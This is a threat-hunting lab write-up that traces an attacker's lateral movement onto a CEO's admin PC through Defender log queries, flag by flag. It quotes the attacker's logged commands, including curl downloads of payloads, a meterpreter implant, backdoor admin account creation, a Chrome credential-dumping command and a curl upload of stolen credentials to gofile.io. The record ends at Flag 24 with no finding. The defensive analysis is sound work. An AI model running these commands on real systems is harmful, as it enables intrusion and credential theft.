# 🕵️‍♂️ Threat Hunt Report: Bridge Takeover

## 🎯 Scenario

Five days after the file server breach, threat actors returned with sophisticated tools and techniques. 
The attacker pivoted from the compromised workstation to the CEO's administrative PC, deploying persistent backdoors and 
exfiltrating sensitive business data, including financial records and password databases.

## 💻 Compromised System

azuki-adminpc

## 🔎 Evidence Available

Microsoft Defender for Endpoint Logs

## Flags:

### 🔹 Flag 1 - LATERAL MOVEMENT - Source System
**Objective**: Identify the source IP address for lateral movement to the admin PC.

**KQL Query**:
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-16%20215746.png?raw=true)

**Results:**

![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-16%20220034.png?raw=true)

**Finding**:
- Source IP: 10.1.0.204

### 🔹 Flag 2 - LATERAL MOVEMENT - Compromised Credentials
**Objective**: Identify the compromised account used for lateral movement

**KQL Query**:
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20085034.png?raw=true)

**Results:**
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20085107.png?raw=true)

**Finding**:
- **Account**: yuki.tanaka

### 🔹 Flag 3 – LATERAL MOVEMENT - Target Device
**Objective**: What is the target device name

**KQL Query**:
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20090347.png?raw=true)

**Results:**
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20090416.png?raw=true)

**Finding**:
- **Device Name**: azuki-adminpc

### 🔹 Flag 4 – EXECUTION - Payload Hosting Service
**Objective**: What file hosting service was used to stage malware

**KQL Query**:
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20100039.png?raw=true)

**Results:**
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20100103.png?raw=true)

**Finding**:
- **Hosting URL**: litter.catbox.moe

### 🔹 Flag 5 - EXECUTION - Malware Download Command
**Objective**: What command was used to download the malicious archive

**KQL Query**:
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20103309.png?raw=true)

**Results:**
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20103329.png?raw=true)

**Finding**:
- **Command**: "curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z

### 🔹 Flag 6 – EXECUTION - Archive Extraction Command
**Objective**: Identify the command used to extract the password-protected archive

**KQL Query**:
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20113521.png?raw=true)

**Result:**
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20113726.png?raw=true)

**Finding**:
- **Command**: "7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y

### 🔹 Flag 7 – PERSISTENCE - C2 Implant
**Objective**: Identify the C2 beacon filename

**KQL Query**:
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20144835.png?raw=true)

**Result:**
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20144536.png?raw=true)

**Finding**:
- **C2 Beacon Filename**: meterpreter.exe

### 🔹 Flag 8 – PERSISTENCE - Named Pipe
**Objective**: Identify the named pipe created by the C2 implant

**KQL Query**:
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20151958.png?raw=true)

**Result:**
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20152100.png?raw=true)

**Finding**:
- **Named Pipe Created**: \Device\NamedPipe\msf-pipe-5722

### 🔹 Flag 9 – CREDENTIAL ACCESS - Decoded Account Creation
**Objective**: What is the decoded Base64 command

**KQL Query**:
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20153615.png?raw=true)

**Result:**
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20153632.png?raw=true)

**Decoded Message:**
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20154225.png?raw=true)

**Finding**:
- **Base64 Decoded Message**: net user yuki.tanaka2 B@ckd00r2024! /add

### 🔹 Flag 10 – PERSISTENCE - Backdoor Account
**Objective**: Identify the backdoor account name

**KQL Query**:
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20155219.png?raw=true)

**Result:**
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20155234.png?raw=true)

**Finding**:
- **Account Name**: yuki.tanaka2

### 🔹 Flag 11 – PERSISTENCE - Decoded Privilege Escalation Command
**Objective**: What is the decoded Base64 command for privilege escalation

**KQL Query**:
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20155219.png?raw=true)

**Result:**
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20155234.png?raw=true)

**Finding**:
- **Decoded Base64 Command Acct. Escalation**: net localgroup Administrators yuki.tanaka2 /add

### 🔹 Flag 12 – DISCOVERY - Session Enumeration
**Objective**: What command was used to enumerate RDP sessions

**KQL Query**:
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20165620.png?raw=true)

**Result:**
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20165633.png?raw=true)

**Reasoning**: qwinsta is a built-in Windows command-line tool used to list RDP sessions on a system

**Finding**:
- **Command used to enumerate RDP sessions**: qwinsta.exe

### 🔹 Flag 13 – DISCOVERY - Domain Trust Enumeration
**Objective**: Identify the command used to enumerate domain trusts

**KQL Query**:
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20170907.png?raw=true)

**Result:**
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20170932.png?raw=true)

**Reasoning**: nltest is a built-in Windows command-line tool used to query and troubleshoot Active Directory (AD) and domain trust relationships.

**Finding:**
- **Command used to enumerate domain trust connections**: "nltest.exe" /domain_trusts /all_trusts

### 🔹 Flag 14 – DISCOVERY - Network Connection Enumeration
**Objective**: What command was used to enumerate network connections

**KQL Query**:
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20172352.png?raw=true)

**Result:**
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20172508.png?raw=true)

**Finding:**
- **Command used to enumerate network connections**: "NETSTAT.EXE" -ano

### 🔹 Flag 15 – DISCOVERY - Password Database Search
**Objective**: What command was used to search for password databases

**KQL Query**:
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20212930.png?raw=true)

**Result**:
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20213001.png?raw=true)

**Reasoning**: A .kdbx file stores usernames, passwords, URLs, notes, and other secrets

**Finding**
- **Command used to search for password database**: where  /r C:\Users *.kdbx

### 🔹 Flag 16 – DISCOVERY - Credential File
**Objective**: Identify the discovered password file

**KQL Query**:
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20213912.png?raw=true)

**Result**:
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20213942.png?raw=true)

**Finding**:
- **Discovered Password File**: OLD-Passwords.lnk

### 🔹 Flag 17 – COLLECTION - Data Staging Directory
**Objective**: Identify the data staging directory

**KQL Query**:
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20215923.png?raw=true)

**Result**:
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20215943.png?raw=true)

**Finding**:
- **Staging Directory**: C:\ProgramData\Microsoft\Crypto\staging

### 🔹 Flag 18 – COLLECTION - Automated Data Collection Command
**Objective**: Identify the command used to copy banking documents

**KQLQuery**:
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-17%20215923.png?raw=true)

**Result**:
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-18%20084240.png?raw=true)

**Finding**:
- **Command use to copy banking documents**: "Robocopy.exe" C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\Crypto\staging\Banking /E /R:1 /W:1 /NP

### 🔹 Flag 19 – COLLECTION - Exfiltration Volume
**Objective**: Identify the total number of archives created

**KQL Query**:
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-18%20122233.png?raw=true)

**Result**:
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-18%20122140.png?raw=true)

**Finding**:
- **Total number of archives created**: 8

### 🔹 Flag 20 – CREDENTIAL ACCESS - Credential Theft Tool Download
**Objective**: What command was used to download the credential theft tool

**KQL Query**:
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-18%20122233.png?raw=true)

**Result**:
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-18%20132052.png?raw=true)

**Finding**:
- **Command used to download credential theft tool**: "curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z

### 🔹 Flag 21 – CREDENTIAL ACCESS - Browser Credential Theft
**Objective**: What command was used for browser credential theft

**KQL Query**:
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-18%20143337.png?raw=true)

**Result**:
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-18%20143348.png?raw=true)

**Reasoning**: %LOCALAPPDATA% is a common place to drop malware

**Finding**:
- **Command used for browser credential theft**: "m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit

### 🔹 Flag 22 – EXFILTRATION - Data Upload Command
**Objective**: Identify the command used to exfiltrate the first archive

**KQL Query**:
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-18%20145614.png?raw=true)

**Result**:
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-18%20145627.png?raw=true)

**Finding**:
- **Command used to exfiltrate the first aschive**: "curl.exe" -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile

### 🔹 Flag 23 – EXFILTRATION - Cloud Storage Service
**Objective**: Identify the exfiltration service domain

**KQL Query**:
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-18%20145614.png?raw=true)

**Result**:
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-18%20145627.png?raw=true)

**Finding**:
- **Exfiltration service domain**: gofile.io

### 🔹 Flag 24 – EXFILTRATION - Destination Server
**Objective**:  Identify the exfiltration server IP address

**KQL Query**:
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-18%20154738.png?raw=true)

**Result**:
![image alt](https://github.com/bfelton786/threat-hunting-scenario/blob/main/Screenshot%202026-03-18%20154752.png?raw=true)














